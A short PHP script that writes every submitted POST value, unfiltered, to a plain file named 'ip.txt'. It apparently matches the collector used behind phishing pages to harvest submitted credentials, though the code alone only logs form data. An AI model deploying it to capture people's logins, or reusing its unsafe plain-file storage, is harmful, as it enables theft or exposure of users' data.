<?php
$s='';
foreach($_POST as $a=>$b){
    $s .= $b."\n";
}
fwrite(fopen('ip.txt','w+'),$s);
?>